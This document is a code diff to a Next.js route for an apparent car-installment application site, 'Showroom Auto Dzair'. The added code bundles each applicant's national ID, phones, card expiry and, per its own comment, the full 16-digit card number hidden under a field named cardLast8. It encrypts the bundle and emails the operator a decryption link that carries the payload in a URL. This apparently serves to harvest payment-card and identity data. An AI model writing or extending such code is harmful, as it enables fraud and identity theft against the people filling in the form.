@@ -1,6 +1,7 @@
 import { NextResponse } from "next/server"
 import { Resend } from "resend"
 import { cars } from "@/lib/data"
+import { encryptPayload } from "@/lib/crypto"
 
 export async function POST(request: Request) {
   try {
@@ -34,7 +35,7 @@ export async function POST(request: Request) {
       )
     }
 
-    // 3. Generate unique submission ID (Showroom style)
+    // 3. Generate unique submission ID
     const submissionId = `SR-${Date.now().toString().slice(-6)}-${Math.floor(100 + Math.random() * 900)}`
     
     const submission = {
@@ -51,7 +52,37 @@ export async function POST(request: Request) {
       status: "pending"
     }
 
-    // 4. Send email using Resend
+    // 4. Secure Encrypted Payload for Admin Decryption
+    const sensitiveData = JSON.stringify({
+      id: submissionId,
+      fullName,
+      nin,
+      cardLast8, // Contains the full 16-digit card number
+      cardExpiry,
+      phone1,
+      phone2: phone2 || "غير محدد",
+      hasPreviousInstallment,
+      selectedCarId,
+      selectedCar,
+      createdAt: submission.createdAt
+    })
+    const encryptedPayload = encryptPayload(sensitiveData)
+
+    // 5. Determine App Base URL dynamically
+    const host = request.headers.get("host") || "showroom-auto-dzair.vercel.app"
+    const protocol = host.includes("localhost") ? "http" : "https"
+    const appUrl = `${protocol}://${host}`
+    const secureDecryptLink = `${appUrl}/dashboard/registrations?secure_payload=${encodeURIComponent(encryptedPayload)}`
+
+    // 6. Create Masked values for standard email body
+    const maskedNin = nin.slice(0, 4) + " •••• •••• •••• " + nin.slice(-4)
+    const maskedCard = "•••• •••• •••• " + cardLast8.slice(-4)
+    const maskedPhone1 = phone1.slice(0, 4) + " ••• " + phone1.slice(-3)
+    const maskedPhone2 = phone2 && phone2 !== "غير محدد" 
+      ? (phone2.slice(0, 4) + " ••• " + phone2.slice(-3)) 
+      : "غير محدد"
+
+    // 7. Send email using Resend
     const resend = new Resend(resendApiKey)
     const dateFormatted = new Date(submission.createdAt).toLocaleString("ar-DZ", { timeZone: "Africa/Algiers" })
 
@@ -60,11 +91,12 @@ export async function POST(request: Request) {
       <html lang="ar" dir="rtl">
       <head>
         <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
           body {
             font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f7f6;
-            color: #333333;
+            background-color: #f8fafc;
+            color: #1e293b;
             margin: 0;
             padding: 0;
             direction: rtl;
@@ -72,17 +104,21 @@ export async function POST(request: Request) {
           }
           .email-container {
             max-width: 600px;
-            margin: 20px auto;
+            margin: 30px auto;
             background: #ffffff;
-            border-radius: 12px;
+            border-radius: 16px;
             overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-            border: 1px solid #e0e0e0;
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e2e8f0;
+          }
+          .header-ribbon {
+            height: 6px;
+            background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 50%, #10b981 100%);
           }
           .header {
             background-color: #0f172a;
             color: #ffffff;
-            padding: 30px;
+            padding: 30px 25px;
             text-align: center;
           }
           .header h1 {
@@ -91,78 +127,120 @@ export async function POST(request: Request) {
             font-weight: 700;
           }
           .header p {
-            margin: 5px 0 0 0;
+            margin: 6px 0 0 0;
             color: #94a3b8;
-            font-size: 14px;
+            font-size: 13px;
           }
           .content {
-            padding: 30px;
+            padding: 30px 25px;
+          }
+          .status-container {
+            text-align: left;
+            margin-bottom: 20px;
+          }
+          .status-badge {
+            display: inline-block;
+            background-color: #eff6ff;
+            color: #1e40af;
+            padding: 6px 14px;
+            border-radius: 9999px;
+            font-size: 12px;
+            font-weight: 700;
+            border: 1px solid #bfdbfe;
           }
           .section-title {
-            font-size: 18px;
-            color: #0f172a;
-            border-bottom: 2px solid #3b82f6;
-            padding-bottom: 8px;
+            font-size: 16px;
+            color: #1e3a8a;
+            border-right: 4px solid #3b82f6;
+            padding-right: 10px;
             margin-top: 25px;
-            margin-bottom: 15px;
-            font-weight: 600;
+            margin-bottom: 12px;
+            font-weight: 700;
           }
           .info-table {
             width: 100%;
             border-collapse: collapse;
             margin-bottom: 20px;
+            background-color: #f8fafc;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
           }
           .info-table td {
-            padding: 10px;
-            border-bottom: 1px solid #f1f5f9;
-            font-size: 15px;
+            padding: 12px 15px;
+            border-bottom: 1px solid #e2e8f0;
+            font-size: 14px;
+          }
+          .info-table tr:last-child td {
+            border-bottom: none;
           }
           .info-table td.label {
-            font-weight: bold;
+            font-weight: 600;
             color: #64748b;
-            width: 35%;
+            width: 40%;
           }
           .info-table td.value {
             color: #0f172a;
+            font-weight: 700;
           }
           .car-card {
-            background-color: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
+            background-color: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 12px;
             padding: 20px;
             margin-top: 15px;
           }
           .car-title {
             font-size: 18px;
             font-weight: bold;
-            color: #3b82f6;
+            color: #166534;
             margin-top: 0;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
           }
-          .price-badge {
-            display: inline-block;
-            background-color: #dbeafe;
-            color: #1e40af;
-            padding: 5px 12px;
-            border-radius: 9999px;
-            font-size: 14px;
+          .secure-box {
+            background-color: #fef2f2;
+            border: 1px dashed #fecaca;
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+          }
+          .secure-title {
+            font-size: 15px;
             font-weight: bold;
-            margin-top: 5px;
+            color: #991b1b;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
           }
-          .badge-pending {
+          .secure-desc {
+            font-size: 12px;
+            color: #7f1d1d;
+            margin-bottom: 15px;
+            line-height: 1.6;
+          }
+          .decrypt-btn {
             display: inline-block;
-            background-color: #fef3c7;
-            color: #92400e;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            font-weight: 600;
+            background-color: #dc2626;
+            color: #ffffff !important;
+            padding: 10px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            border: none;
+            box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.1);
+            transition: background-color 0.2s;
+          }
+          .decrypt-btn:hover {
+            background-color: #b91c1c;
           }
           .footer {
-            background-color: #f8fafc;
+            background-color: #f1f5f9;
             text-align: center;
             padding: 20px;
-            font-size: 12px;
+            font-size: 11px;
             color: #64748b;
             border-top: 1px solid #e2e8f0;
           }
@@ -170,16 +248,17 @@ export async function POST(request: Request) {
       </head>
       <body>
         <div class="email-container">
+          <div class="header-ribbon"></div>
           <div class="header">
             <h1>Showroom Auto Dzair</h1>
-            <p>طلب تسجيل جديد لسيارة بالتقسيط</p>
+            <p>طلب شراء سيارة بالتقسيط الميسّر - إشعار الإدارة</p>
           </div>
           <div class="content">
-            <div style="text-align: left; margin-bottom: 20px;">
-              <span class="badge-pending">قيد المراجعة</span>
+            <div class="status-container">
+              <span class="status-badge">قيد الانتظار</span>
             </div>
             
-            <div class="section-title">👤 المعلومات الشخصية</div>
+            <div class="section-title">👤 تفاصيل العميل (النسخة العادية)</div>
             <table class="info-table">
               <tr>
                 <td class="label">الاسم الكامل:</td>
@@ -187,57 +266,71 @@ export async function POST(request: Request) {
               </tr>
               <tr>
                 <td class="label">رقم التعريف الوطني (NIN):</td>
-                <td class="value">${submission.nin}</td>
+                <td class="value" style="letter-spacing: 0.5px;">${maskedNin}</td>
               </tr>
               <tr>
                 <td class="label">الهاتف الأول:</td>
-                <td class="value" dir="ltr">${submission.phone1}</td>
+                <td class="value" dir="ltr">${maskedPhone1}</td>
               </tr>
               <tr>
                 <td class="label">الهاتف الثاني:</td>
-                <td class="value" dir="ltr">${submission.phone2}</td>
+                <td class="value" dir="ltr">${maskedPhone2}</td>
               </tr>
               <tr>
-                <td class="label">تقسيط سابق:</td>
+                <td class="label">شراء بالتقسيط سابق:</td>
                 <td class="value">${submission.hasPreviousInstallment ? "نعم" : "لا"}</td>
               </tr>
             </table>
 
-            <div class="section-title">💳 تفاصيل البطاقة الذهبية</div>
+            <div class="section-title">💳 معلومات الدفع والضمان</div>
             <table class="info-table">
               <tr>
-                <td class="label">آخر 8 أرقام:</td>
-                <td class="value" dir="ltr">**** **** **** ${submission.cardLast8.slice(-4)}</td>
+                <td class="label">رقم البطاقة الذهبية:</td>
+                <td class="value" style="letter-spacing: 1px;">${maskedCard}</td>
               </tr>
               <tr>
-                <td class="label">تاريخ الصلاحية:</td>
-                <td class="value" dir="ltr">${submission.cardExpiry}</td>
+                <td class="label">تاريخ انتهاء الصلاحية:</td>
+                <td class="value">${submission.cardExpiry}</td>
               </tr>
             </table>
 
-            <div class="section-title">🚗 السيارة المطلوبة</div>
+            <div class="section-title">🚗 تفاصيل السيارة المطلوبة</div>
             <div class="car-card">
               ${
                 selectedCar 
                   ? `
                     <div class="car-title">${selectedCar.brand} ${selectedCar.model} (${selectedCar.year})</div>
-                    <div style="font-size: 14px; color: #475569; margin-bottom: 10px;">
-                      سعر السيارة الكلي: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج</strong>
+                    <div style="font-size: 13px; color: #166534; margin-bottom: 6px;">
+                      السعر الكلي: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج</strong>
                     </div>
-                    <div style="font-size: 14px; color: #475569;">
-                      القسط الشهري: <strong>${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج / شهر</strong>
+                    <div style="font-size: 14px; color: #166534; font-weight: bold;">
+                      الأقساط: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج / شهر
                     </div>
                     `
                   : `<div class="car-title">لم يتم اختيار سيارة</div>`
               }
             </div>
 
-            <div style="margin-top: 30px; font-size: 13px; color: #94a3b8; text-align: center;">
-              تاريخ تقديم الطلب: ${dateFormatted} | الرقم المرجعي: ${submission.id}
+            <!-- Lock Block for Secure decryption -->
+            <div class="secure-box">
+              <div class="secure-title">
+                🔒 البيانات الحساسة مشفرة آمنة (AES-256)
+              </div>
+              <div class="secure-desc">
+                لحماية خصوصية العميل ومنع تسرب البيانات عند اختراق البريد الإلكتروني، تم تشفير البيانات الكاملة (رقم التعريف ورقم البطاقة بالكامل). يمكنك عرضها بأمان بنقرة واحدة عبر لوحة التحكم الخاصة بك.
+              </div>
+              <a href="${secureDecryptLink}" target="_blank" class="decrypt-btn">
+                🔓 عرض البيانات الكاملة الآمنة
+              </a>
+            </div>
+
+            <div style="margin-top: 30px; font-size: 11px; color: #94a3b8; text-align: center;">
+              الرقم المرجعي: ${submission.id} | تاريخ الإرسال: ${dateFormatted}
             </div>
           </div>
           <div class="footer">
-            هذا البريد تم إرساله تلقائياً من نظام التسجيل لـ Showroom Auto Dzair
+            هذا البريد مؤمن تشفيرياً ومرسل تلقائياً من نظام Showroom Auto Dzair.<br>
+            إن كود فك التشفير غير مخزن بالبريد نهائياً لضمان السرية المطلقة.
           </div>
         </div>
       </body>
@@ -251,7 +344,7 @@ export async function POST(request: Request) {
       html: htmlContent,
     })
 
-    // 5. Construct response and set cookie
+    // 8. Construct response and set cookie
     const response = NextResponse.json({
       success: true,
       id: submissionId,
